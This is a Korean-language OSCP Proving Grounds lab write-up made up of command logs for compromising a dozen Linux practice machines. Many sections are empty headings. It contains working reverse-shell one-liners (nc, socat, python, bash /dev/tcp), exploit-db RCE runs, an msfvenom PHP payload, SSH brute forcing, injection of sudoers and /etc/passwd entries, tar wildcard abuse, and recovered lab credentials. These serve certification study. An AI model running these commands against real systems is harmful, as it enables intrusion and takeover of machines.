---
layout: post
title: OSCP Proving Ground
subtitle: OSCP Proving Ground WriteUp
author: g3rm
categories:
banner:
  image: /assets/images/banners/home.gif
  opacity: 0.618
  background: "#000"
  heading_style: "font-size: 4.25em; font-weight: bold;"
  subheading_style: "color: gold"
tags:
  - OSCP
sidebar:
---

## Info
OSCP 자격증 합격을 위해 유용한 문제들로 구성된 [리스트](https://docs.google.com/spreadsheets/d/18weuz_Eeynr6sXFQ87Cd5F0slOj9Z6rt/edit?pli=1&gid=487240997#gid=487240997)를 참고하여 풀이 방법을 남깁니다.

## Linux 
### ClamAV : 25 SMTP
```shell
# port scan
sudo nmap -sC -sV -Pn -p- 192.168.xxx.xxx -oN xxx.xxx_allport
PORT      STATE SERVICE     VERSION
25/tcp    open  smtp        Sendmail 8.13.4/8.13.4/Debian-3sarge3
| smtp-commands: localhost.localdomain Hello [192.168.45.185], pleased to meet you, ENHANCEDSTATUSCODES, PIPELINING, EXPN, VERB, 8BITMIME, SIZE, DSN, ETRN, DELIVERBY, HELP
|_ 2.0.0 This is sendmail version 8.13.4 2.0.0 Topics: 2.0.0 HELO EHLO MAIL RCPT DATA 2.0.0 RSET NOOP QUIT HELP VRFY 2.0.0 EXPN VERB ETRN DSN AUTH 2.0.0 STARTTLS 2.0.0 For more info use "HELP <topic>". 2.0.0 To report bugs in the implementation send email to 2.0.0 sendmail-bugs@sendmail.org. 2.0.0 For local information send email to Postmaster at your site. 2.0.0 End of HELP info

# smtp get info
snmp-check 192.168.xxx.xxx -c public
[*] Processes:

  Id                    Status                Name                  Path                  Parameters                       
  3779                  runnable              clamav-milter         /usr/local/sbin/clamav-milter  --black-hole-mode -l -o -q /var/run/clamav/clamav-milter.ctl


# 실행중인 process 중 clamav-milter 에 취약점 있음
searchsploit clamav-milter
searchsploit -m 4761
perl 4761.pl 192.168.xxx.xxx
nc -nv 192.168.xxx.xxx 31337
```

### Pelican : Exhibitor - gcore
```shell
# port scan
sudo nmap -sC -sV -Pn -p- 192.168.180.98 -oN 180.98_allport
8080/tcp  open  http        Jetty 1.0
|_http-server-header: Jetty(1.0)
|_http-title: Error 404 Not Found
8081/tcp  open  http        nginx 1.14.2
|_http-server-header: nginx/1.14.2
|_http-title: Did not follow redirect to http://192.168.180.98:8080/exhibitor/v1/ui/index.html

# 8080 : Exhibitor Web UI 1.7.1 - Remote Code Execution
# https://www.exploit-db.com/exploits/48654
$(/bin/nc -e /bin/sh kali_ip 8888 &)

# nc
nc -nvlp 8888
/usr/bin/script -qc /bin/bash /dev/null

# linpeas
python3 -m http.server 80
wget http://kali/linpeas.sh
./linpeas.sh

╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid                                                             
Matching Defaults entries for charles on pelican:                                                                                                           
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User charles may run the following commands on pelican:
    (ALL) NOPASSWD: /usr/bin/gcore
Sudoers file: /etc/sudoers.d/charles is readable
charles ALL=(ALL) NOPASSWD:/usr/bin/gcore

                      ╔════════════════════════════════════╗
══════════════════════╣ Files with Interesting Permissions ╠══════════════════════                                                                          
                      ╚════════════════════════════════════╝                                                                                                
╔══════════╣ SUID - Check easy privesc, exploits and write perms
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid    
-rws--x--x 1 root root 17K Sep 10  2020 /usr/bin/password-store (Unknown SUID binary!)


╔══════════╣ Running processes (cleaned)
╚ Check weird & unexpected processes run by root: https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#processes   
root       513  0.0  0.0   2276    72 ?        Ss   09:16   0:00 /usr/bin/password-store

# GTFObins
sudo gcore $PID
sudo -u root /usr/bin/gcore -a -o <outputfile> <pid>
strings <outputfile>
001 Password: root:
ClogKingpinInning731

# root 
95cee2bcb5cb60a70ef4c6bb62a36b64
su -
Password: ClogKingpinInning731
```

### Payday : CS-Cart - sudo -l
```shell
# port scan
sudo nmap -sC -sV -Pn -p- 192.168.207.39 -oN 207.39_allport
80/tcp  open  http        Apache httpd 2.2.4 ((Ubuntu) PHP/5.2.3-1ubuntu6)
|_http-server-header: Apache/2.2.4 (Ubuntu) PHP/5.2.3-1ubuntu6
|_http-title: CS-Cart. Powerful PHP shopping cart software

# web exploit
whatweb http://192.168.207.39
http://192.168.207.39 [200 OK] Apache[2.2.4], CS-Cart, Cookies[cart_languageC,csid,secondary_currencyC], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.2.4 (Ubuntu) PHP/5.2.3-1ubuntu6], IP[192.168.207.39], Meta-Author[CS-Cart.com], PHP[5.2.3-1ubuntu6], PasswordField[password], PoweredBy[the], Script[javascript], Title[CS-Cart. Powerful PHP shopping cart software], X-Powered-By[PHP/5.2.3-1ubuntu6]

gobuster dir -u 192.168.207.39 -w /usr/share/wordlists/dirb/common.txt 
/admin.php            (Status: 200) [Size: 9483]
/admin                (Status: 200) [Size: 9483]

# admin:admin 추측
# https://www.exploit-db.com/exploits/48891 : CS-Cart 1.3.3 - authenticated RCE
Template editor에서 쉘 업로드 후 아래 url로 접근
http://192.168.207.39/skins/php-reverse-shell.phtml

# linpeas.sh 돌리기
# 별거없음

# ssh brute force
crackmapexec ssh 192.168.189.39 -u patrick -p /usr/share/wordlists/rockyou.txt
patrick:patrick
ssh -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa user@192.168.207.39

# escal
sudo -l
sudo su

```
### Snookums : SimplePHPGal - passwd
```shell
# port scan
sudo nmap -sC -sV -Pn -p- 192.168.207.58 -oN 207.58_allport
80/tcp    open  http        Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
|_http-title: Simple PHP Photo Gallery

# web
whatweb http://192.168.207.58
http://192.168.207.58 [200 OK] Apache[2.4.6], Country[RESERVED][ZZ], Google-Analytics[UA-2196019-1], HTML5, HTTPServer[CentOS][Apache/2.4.6 (CentOS) PHP/5.4.16], IP[192.168.207.58], JQuery[1.7.2], Lightbox, PHP[5.4.16], Script, Title[Simple PHP Photo Gallery], X-Powered-By[PHP/5.4.16]

# web enum
dirsearch -u http://192.168.230.58 -w /usr/share/seclists/Discovery/Web-Content/big.txt -r -t 60 --full-url

# SimplePHPGal 0.7 - Remote File Inclusion
https://www.exploit-db.com/exploits/48424
msfvenom -p php/reverse_php LHOST=192.168.45.185 LPORT=8888 -f raw -o php_reverse_9999.pHP
http://192.168.207.58/image.php?img=http://192.168.45.185/php_reverse_8888.pHP

# config cat
cat /var/www/html/db.php
define('DBUSER', 'root');
define('DBPASS', 'MalapropDoffUtilize1337');
SimplePHPGal

# mysql login
mysql -u root -p
Enter password: MalapropDoffUtilize1337

use SimplePHPGal;
show tables;
select * from users;

Tables_in_SimplePHPGal
users
username        password
josh    VFc5aWFXeHBlbVZJYVhOelUyVmxaSFJwYldVM05EYz0=
michael U0c5amExTjVaRzVsZVVObGNuUnBabmt4TWpNPQ==
serena  VDNabGNtRnNiRU55WlhOMFRHVmhiakF3TUE9PQ==

# password decode - HockSydneyCertify123
echo -n "U0c5amExTjVaRzVsZVVObGNuUnBabmt4TWpNPQ==" | base64 -d
echo -n "SG9ja1N5ZG5leUNlcnRpZnkxMjM=" | base64 -d

# linpeas
╔══════════╣ Permissions in init, init.d, systemd, and rc.d
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#init-initd-systemd-and-rcd                                                
                                                                                                                                                            
═╣ Hashes inside passwd file? ........... No
═╣ Writable passwd file? ................ /etc/passwd is writable                

# passwd 생성
openssl passwd -1 -salt password password 
echo 'owned:$1$password$Da2mWXlxe6J7jtww12SNG/:0:0:owned:/root:/bin/bash' >> /etc/passwd

```
### Bratarina : SMTP
```shell
# port scan
sudo nmap -sC -sV -Pn -p- 192.168.207.71 -oN 207.71_allport
25/tcp  open   smtp        OpenSMTPD
| smtp-commands: bratarina Hello nmap.scanme.org [192.168.45.185], pleased to meet you, 8BITMIME, ENHANCEDSTATUSCODES, SIZE 36700160, DSN, HELP
|_ 2.0.0 This is OpenSMTPD 2.0.0 To report bugs in the implementation, please contact bugs@openbsd.org 2.0.0 with full details 2.0.0 End of HELP info
445/tcp open   netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: COFFEECORP)

# smb - 레빗홀
crackmapexec smb 192.168.207.71 -u '' -p '' --shares
crackmapexec smb 192.168.207.71 -u '' -p '' --spider backups --regex .
SMB         192.168.207.71  445    BRATARINA        //192.168.207.71/backups/passwd.bak [lastm:'2020-07-06 16:46' size:1747]

smbclient //192.168.207.71/backups
get passwd.bak

# smtp
searchsploit OpenSMTPD
python3 47984.py 192.168.207.71 25 'python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.45.185\",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")"'  

```
### Pebbles
```shell
# port scan
sudo nmap -sC -sV -Pn -p- 192.168.207.52 -oN 207.52_allport
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Pebbles
3305/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
8080/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION
|_http-title: Tomcat
|_http-favicon: Apache Tomcat

# web scan
feroxbuster -u http://192.168.207.52:8080 -w /usr/share/seclists/Discovery/Web-Content/big.txt -o 207.52:8080
feroxbuster -u http://192.168.207.52:80 -w /usr/share/seclists/Discovery/Web-Content/big.txt -o 207.52:80
feroxbuster -u http://192.168.207.52:3305 -w /usr/share/seclists/Discovery/Web-Content/big.txt -o 207.52:3305

[ZoneMinder] Console - [Running] - default [v1.29.0]
searchsploit zoneminder 
Zoneminder 1.29/1.30 - Cross-Site Scripting / SQL Injection / Session Fixation / Cross-Site Request Forgery               | php/webapps/41239.txt

# sql injection
searchsploit -m 41239
limit=100;SELECT SLEEP(10)#

```
### Nibbles
```shell
# port scan
sudo nmap -sC -sV -Pn -p- 192.168.207.47 -oN 207.47_allport
5437/tcp open   postgresql   PostgreSQL DB 11.3 - 11.9

# postgres:postgres
searchsploit postgres 
PostgreSQL 9.3-11.7 - Remote Code Execution (RCE) (Authenticated)                                                         | multiple/remote/50847.py

searchsploit -m 50847
python3 50847.py -i 192.168.207.47 -p 5437 -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.45.185 8888>/tmp/f'

# linpeas
╔══════════╣ SUID - Check easy privesc, exploits and write perms
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid  
-rwsr-xr-x 1 root root 309K Feb 16  2019 /usr/bin/find


```
### Hetemit
```shell
# port scan
sudo nmap -sC -sV -Pn -p- 192.168.207.117 -oN 207.117_allport
18000/tcp open  biimenu?
50000/tcp open  http        Werkzeug httpd 1.0.1 (Python 3.6.8)
|_http-server-header: Werkzeug/1.0.1 Python/3.6.8
|_http-title: Site doesn't have a title (text/html; charset=utf-8).

# web 50000 post
curl -X POST --data "code=os.system('socat TCP:192.168.45.185:1337 EXEC:sh')" http://192.168.121.36:50000/verify

# linpeas
╔══════════╣ Interesting GROUP writable files (not in Home) (max 200)
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#writable-files                                                            
  Group cmeeks:                                                                                                                                             
/etc/systemd/system/pythonapp.service  

# 설정파일 수정
vi /etc/systemd/system/pythonapp.service 
ExecStart=/home/cmeeks/reverse.sh
User=root

# reverse shell
cat <<'EOT'> /home/cmeeks/reverse.sh 
#!/bin/bash 
socat TCP:192.168.45.185:80 EXEC:sh 
EOT
chmod +x /home/cmmeks/reverse.sh
reboot

```
### ZenPhoto
```shell
# port scan
sudo nmap -sC -sV -Pn -p- 192.168.207.41 -oN 207.41_allport
80/tcp   open  http    Apache httpd 2.2.14 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.2.14 (Ubuntu)

# web
feroxbuster -u http://192.168.207.41 -w /usr/share/seclists/Discovery/Web-Content/big.txt -o 207.41
http://192.168.207.41/test 개발자 도구 하단 zenphoto version 1.4.1.4

# cve
searchsploit zenphoto 
ZenPhoto 1.4.1.4 - 'ajax_create_folder.php' Remote Code Execution                                                         | php/webapps/18083.php
php 18083.php 192.168.207.41 /test/

# priv escal
╔══════════╣ Executing Linux Exploit Suggester
╚ https://github.com/mzet-/linux-exploit-suggester  
[+] [CVE-2021-4034] PwnKit

wget https://codeload.github.com/berdav/CVE-2021-4034/zip/main
wget http://192.168.45.185/main
unzip main
make

```
### Nukem
```shell
# port scan
sudo nmap -sC -sV -Pn -p- 192.168.231.105 -oN 231.105_allport
80/tcp    open  http        Apache httpd 2.4.46 ((Unix) PHP/7.4.10)
|_http-generator: WordPress 5.5.1

wpscan --url http://192.168.231.105 
[i] Plugin(s) Identified:
[+] simple-file-list

searchsploit simple file list
WordPress Plugin Simple File List 4.2.2 - Remote Code Execution                                                           | php/webapps/48449.py

# exploit
vi 48449.py
payload = '<?php passthru("bash -i >& /dev/tcp/192.168.45.185/22 0>&1"); ?>'

# linpeas.sh
╔══════════╣ Analyzing Wordpress Files (limit 70)
-rw-r--r-- 1 http root 2913 Sep 18  2020 /srv/http/wp-config.php                                                                                            
define( 'DB_NAME', 'wordpress' );
define( 'DB_USER', 'commander' );
define( 'DB_PASSWORD', 'CommanderKeenVorticons1990' );
define( 'DB_HOST', 'localhost' );


                      ╔════════════════════════════════════╗
══════════════════════╣ Files with Interesting Permissions ╠══════════════════════                                                                          
                      ╚════════════════════════════════════╝                                                                                                
╔══════════╣ SUID - Check easy privesc, exploits and write perms
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid    
-rwsr-xr-x 1 root root 2.5M Jul  7  2020 /usr/bin/dosbox

# exploit
LFILE='/etc/sudoers'
dosbox -c 'mount c /' -c "echo commander ALL=(ALL) ALL >>c:$LFILE" -c exit
```

### Cockpit *
```shell
# port scan 
sudo nmap -sC -sV -Pn -p- 192.168.231.10 -oN 231.10_allport
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: blaze
9090/tcp open  http    Cockpit web service 198 - 220
|_http-title: Did not follow redirect to https://192.168.231.10:9090/

# dir scan
feroxbuster -u http://192.168.231.10 -w /usr/share/dirb/wordlists/common.txt -o 231.10 -x php 
200      GET       28l       63w      769c http://192.168.231.10/login.php

# sql injection & password get
## james
echo "Y2FudHRvdWNoaGh0aGlzc0A0NTUxNTI=" | base64 -d 
canttouchhhthiss@455152
## cameron
echo "dGhpc3NjYW50dGJldG91Y2hlZGRANDU1MTUy" | base64 -d
thisscanttbetouchedd@455152

# 9090 login & ssh key 등록
ssh-keygen -t ECDSA -f james_ecdsa
cat james_ecdsa.pub 
ssh james@192.168.231.10 -i james_ecdsa 

# exploit
sudo -l
# payload.sh
echo 'james ALL=(root) NOPASSWD: ALL' > /etc/sudoers
echo "" > '--checkpoint=1'  
echo "" > '--checkpoint-action=exec=sh payload.sh'
sudo /usr/bin/tar -czvf /tmp/backup.tar.gz *

```

### Clue
```shell
# port scan
sudo nmap -sC -sV -Pn -p- 192.168.231.240 -oN 231.240_allport
8021/tcp open  freeswitch-event FreeSWITCH mod_event_socket

```

### Extplorer
```shell
# port scan
sudo nmap -sC -sV -Pn -p- 192.168.231.16 -oN 231.16_allport
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)

# dir scan
wpscan --url http://192.168.231.16
feroxbuster -u http://192.168.231.16 -w /usr/share/seclists/Discovery/Web-Content/big.txt
301      GET        9l       28w      322c http://192.168.231.16/filemanager => http://192.168.231.16/filemanager/

# admin:admin filemanager
filemanager/config/.htusers.php credential
'dora','$2a$08$zyiNvVoP/UuSMgO2rKDtLuox.vYj.3hZPVYq3i4oG3/CtgET7CjjS'

# crack - 레빗홀
echo "$2a$08$zyiNvVoP/UuSMgO2rKDtLuox.vYj.3hZPVYq3i4oG3/CtgET7CjjS" > dora.hash
doraemon

# reverse shell upload
curl http://192.168.231.16/wp-admin/php-reverse-shell.php

# privilege
groups=1000(dora),6(disk)

```

### Postfish

### Hawat

### Walla

### PC

### Apex

### Sorcerer

### Sybaris

### Peppo

### Hunit

### Readys

### Astronaut

### Bullybox

### Marketing

### Exfiltrated

### Fanatastic

### QuackerJack

### Wombo

### Flu

### Roquefort

### Levram

### Mzeeav

### LaVita

### Xposedapi

### Zipper

### Workaholic

### Fired

### Scrutiny

### SPX

### Vmdak

### Mantis

### BitForge

### WallpaperHub

### Zab

### SpiderSociety


## Windows
### Kevin

### Internal

### Algernon

### Jacko

### Craft

### Squid

### Nickel

### MedJed

### Billyboss

### Shenzi

### AuthBy

### Slort

### Hepet

### DVR4

### Mice

### Monster

### Fish


## AD
### Access

### Resourced

### Nagoya

### Hokkaido

### Hutch

### Vault










